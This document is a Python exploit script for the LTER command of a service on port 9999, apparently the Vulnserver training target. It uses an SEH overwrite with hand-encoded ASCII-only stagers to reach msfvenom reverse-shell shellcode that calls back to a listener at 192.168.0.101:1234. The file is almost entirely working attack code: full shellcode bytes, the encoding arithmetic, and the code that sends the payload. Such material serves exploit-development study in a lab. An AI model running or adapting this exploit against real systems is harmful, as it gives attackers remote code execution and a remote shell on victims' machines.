# LTER exploit with SEH and limited character restriction (ASCII) and buffer sizes using manually encoded shellcode
# LTER can also be exploited with normal EIP overwrite with smaller overflow
# Note that all addresses shown in the working out are not absolute and constantly change with each run of the application, therefore the addresses are at the time of my exploitation and will be different to yours. However, the offset should be the same
# Tested on Windows 7 Ultimate 32-bit

import socket
import sys
import time

RHOST = "192.168.0.108"
RPORT = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.101 LPORT=1234 -e x86/alpha_mixed -v shellcode -f python exitfunc=seh -b "\x00\x0a\x0d\x20\x2f" bufferregister=ebx
# As ebx points to shellcode, we use bufferegister=ebx

shellcode =  b""
shellcode += b"\x53\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += b"\x49\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a"
shellcode += b"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51"
shellcode += b"\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
shellcode += b"\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x5a"
shellcode += b"\x48\x6f\x72\x43\x30\x57\x70\x53\x30\x63\x50"
shellcode += b"\x4c\x49\x4d\x35\x64\x71\x59\x50\x61\x74\x4e"
shellcode += b"\x6b\x36\x30\x44\x70\x4c\x4b\x71\x42\x56\x6c"
shellcode += b"\x4e\x6b\x52\x72\x56\x74\x6c\x4b\x42\x52\x45"
shellcode += b"\x78\x36\x6f\x6f\x47\x30\x4a\x31\x36\x64\x71"
shellcode += b"\x69\x6f\x4e\x4c\x65\x6c\x51\x71\x61\x6c\x66"
shellcode += b"\x62\x64\x6c\x67\x50\x6f\x31\x58\x4f\x74\x4d"
shellcode += b"\x67\x71\x6b\x77\x78\x62\x4b\x42\x31\x42\x31"
shellcode += b"\x47\x4c\x4b\x70\x52\x74\x50\x4e\x6b\x43\x7a"
shellcode += b"\x75\x6c\x4c\x4b\x70\x4c\x54\x51\x61\x68\x4d"
shellcode += b"\x33\x30\x48\x77\x71\x38\x51\x63\x61\x6e\x6b"
shellcode += b"\x36\x39\x55\x70\x33\x31\x6b\x63\x4c\x4b\x72"
shellcode += b"\x69\x46\x78\x79\x73\x45\x6a\x42\x69\x4c\x4b"
shellcode += b"\x55\x64\x6e\x6b\x33\x31\x49\x46\x75\x61\x69"
shellcode += b"\x6f\x6e\x4c\x39\x51\x78\x4f\x36\x6d\x53\x31"
shellcode += b"\x79\x57\x37\x48\x69\x70\x44\x35\x38\x76\x57"
shellcode += b"\x73\x43\x4d\x5a\x58\x37\x4b\x73\x4d\x76\x44"
shellcode += b"\x71\x65\x39\x74\x62\x78\x4e\x6b\x76\x38\x65"
shellcode += b"\x74\x36\x61\x48\x53\x71\x76\x6e\x6b\x54\x4c"
shellcode += b"\x30\x4b\x6e\x6b\x51\x48\x65\x4c\x35\x51\x59"
shellcode += b"\x43\x6e\x6b\x57\x74\x4c\x4b\x53\x31\x58\x50"
shellcode += b"\x6b\x39\x37\x34\x34\x64\x64\x64\x53\x6b\x51"
shellcode += b"\x4b\x50\x61\x43\x69\x30\x5a\x62\x71\x49\x6f"
shellcode += b"\x39\x70\x73\x6f\x71\x4f\x50\x5a\x4e\x6b\x34"
shellcode += b"\x52\x6a\x4b\x6c\x4d\x61\x4d\x35\x38\x64\x73"
shellcode += b"\x37\x42\x53\x30\x73\x30\x70\x68\x50\x77\x31"
shellcode += b"\x63\x46\x52\x71\x4f\x72\x74\x63\x58\x52\x6c"
shellcode += b"\x34\x37\x34\x66\x34\x47\x79\x6f\x5a\x75\x68"
shellcode += b"\x38\x5a\x30\x75\x51\x43\x30\x43\x30\x77\x59"
shellcode += b"\x5a\x64\x61\x44\x42\x70\x63\x58\x77\x59\x4d"
shellcode += b"\x50\x70\x6b\x55\x50\x59\x6f\x68\x55\x66\x30"
shellcode += b"\x70\x50\x32\x70\x30\x50\x57\x30\x50\x50\x77"
shellcode += b"\x30\x50\x50\x52\x48\x7a\x4a\x76\x6f\x59\x4f"
shellcode += b"\x69\x70\x69\x6f\x6b\x65\x4a\x37\x73\x5a\x65"
shellcode += b"\x55\x73\x58\x6b\x70\x6c\x68\x73\x30\x45\x35"
shellcode += b"\x71\x78\x77\x72\x45\x50\x45\x54\x79\x42\x4b"
shellcode += b"\x39\x5a\x46\x52\x4a\x42\x30\x72\x76\x33\x67"
shellcode += b"\x62\x48\x6d\x49\x6e\x45\x62\x54\x63\x51\x39"
shellcode += b"\x6f\x69\x45\x6c\x45\x69\x50\x54\x34\x74\x4c"
shellcode += b"\x69\x6f\x62\x6e\x33\x38\x31\x65\x5a\x4c\x51"
shellcode += b"\x78\x6c\x30\x6e\x55\x4e\x42\x73\x66\x39\x6f"
shellcode += b"\x58\x55\x32\x48\x61\x73\x62\x4d\x61\x74\x43"
shellcode += b"\x30\x4c\x49\x69\x73\x32\x77\x70\x57\x62\x77"
shellcode += b"\x65\x61\x58\x76\x70\x6a\x66\x72\x30\x59\x56"
shellcode += b"\x36\x39\x72\x49\x6d\x53\x56\x59\x57\x51\x54"
shellcode += b"\x36\x44\x35\x6c\x47\x71\x33\x31\x6e\x6d\x67"
shellcode += b"\x34\x31\x34\x54\x50\x6a\x66\x57\x70\x67\x34"
shellcode += b"\x76\x34\x50\x50\x32\x76\x36\x36\x50\x56\x33"
shellcode += b"\x76\x53\x66\x30\x4e\x56\x36\x42\x76\x66\x33"
shellcode += b"\x53\x66\x52\x48\x51\x69\x6a\x6c\x45\x6f\x4c"
shellcode += b"\x46\x79\x6f\x4b\x65\x6f\x79\x6b\x50\x72\x6e"
shellcode += b"\x51\x46\x67\x36\x4b\x4f\x50\x30\x71\x78\x53"
shellcode += b"\x38\x4e\x67\x65\x4d\x75\x30\x4b\x4f\x58\x55"
shellcode += b"\x4d\x6b\x69\x6e\x56\x6e\x66\x52\x38\x6a\x62"
shellcode += b"\x48\x4f\x56\x6f\x65\x4d\x6d\x6f\x6d\x79\x6f"
shellcode += b"\x59\x45\x37\x4c\x73\x36\x43\x4c\x75\x5a\x4f"
shellcode += b"\x70\x6b\x4b\x49\x70\x42\x55\x66\x65\x6f\x4b"
shellcode += b"\x37\x37\x56\x73\x31\x62\x42\x4f\x43\x5a\x57"
shellcode += b"\x70\x63\x63\x69\x6f\x38\x55\x41\x41"

# First Stage
# jmp 83 bytes backwards - manually encoded
# Payload size: 45
# 0171ECA4 - Initial ESP value after nseh jmp 
# 0171FFFF - Target ESP value to start decoding (very end of buffer)
# 0xFFFFFFFF-(0x0171FFFF-0x0171ECA4) + 0x00000001 = ffff eca5
# ff = 66+66+33
# ff = 66+66+33
# ec = 66+65+21
# a5 = 63+31+11 
# -----------------------------------
# 66666663 + 66666531 + 33332111

# I want to encode \xeb\x83\x90\x90 = 909083eb
# (0xFFFFFFFF-0x909083eb) + 0x00000001 = 6f6f 7c15
# 6f = 66+06+03
# 6f = 66+06+03
# 7c = 66+13+03
# 15 = 12+02+01
# -----------------------------------
#  66666612 + 06061302 + 03030301

# PUSH ESP
# POP EAX
# SUB EAX, 0x66666663
# SUB EAX, 0x66666531
# SUB EAX, 0x33332111
# PUSH EAX
# POP ESP
# AND EAX, 0x554E4D4A
# AND EAX, 0x2A313235
# SUB EAX, 0x66666612
# SUB EAX, 0x06061302
# SUB EAX, 0x03030301
# PUSH EAX

first_stage = "\x54\x58\x2D\x63\x66\x66\x66\x2D\x31\x65\x66\x66\x2D\x11\x21\x33\x33\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x12\x66\x66\x66\x2D\x02\x13\x06\x06\x2D\x01\x03\x03\x03\x50"

# Second Stage - first stage has given 68 bytes to work with
# The idea is to make EBX point to shellcode and execute the encoded JMP EBX 
# Payload size: 50

# SUB AX
# Current ESP = 0186FFFB 
# Target ESP of shellcode = 0186F20C 
# 0x0186FFFB  - 0x0186F20C  = def
# 0d = 06 + 06 + 01
# ef = 66 + 66 + 23
# 0666 0666 0123

# ADD AX
# We find that EBX can do single ADD AX to get to placement of decoded shellcode.
# Current EAX = 017FED80 
# Target value to put decoded JMP EBX = 017FFFC0
# 0x017FFFC0- 0x017FED80 = 2fe

# ^FFE3             JMP ESP
# "zzx90\x90\xFF\xE3"
# I want to encode \x90\x90\xFF\xE3 = e3ff9090
# (0xFFFFFFFF-0xe3ff9090) + 0x00000001 = 1c00 6f70
# 1c = 16+03+02 (+01)
# 00 = 66+66+34 (overflowed value of 100)
# 6f = 66+06+03
# 70 = 40+20+10
# -----------------------------------
#  16666640 + 03660620 + 02340310

# PUSH ESP
# POP EAX
# SUB AX, 0x0666
# SUB AX, 0x0666
# SUB AX, 0x0123
# PUSH EAX
# POP EBX
# PUSH EBP
# POP EAX
# ADD AX, 0x1240
# PUSH EAX
# POP ESP
# AND EAX, 0x554E4D4A
# AND EAX, 0x2A313235
# SUB EAX, 0x16666640
# SUB EAX, 0x03660620
# SUB EAX, 0x02340310
# PUSH EAX

second_stage = "\x54\x58\x66\x2D\x66\x06\x66\x2D\x66\x06\x66\x2D\x23\x01\x50\x5B\x55\x58\x66\x05\x40\x12\x50\x5C\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x40\x66\x66\x16\x2D\x20\x06\x66\x03\x2D\x10\x03\x34\x02\x50"

nseh = "\x76\x06\x41\x49" # Conditional JMP 0x06
seh = "\x5e\x19\x50\x62" # 0x6250195e POP-POP-RET
padding_1 = "\x41"*3 # to make ESP mod 4 = 0
padding_2 = "\x41\x49"*((68-len(second_stage))/2) # space for buffer to decode
padding_3 = "\x41"*(3515-len(shellcode)-68-len(padding_1)) # 

buf = "LTER /.:/" + padding_1 + shellcode + padding_3 + second_stage + padding_2 + nseh + seh + first_stage + "\x42"*200

print(s.recv(1024))
print("[+] Sending exploit...")
time.sleep(1)
s.send(buf)
s.send("\r\n")
print(s.recv(1024))
s.close()
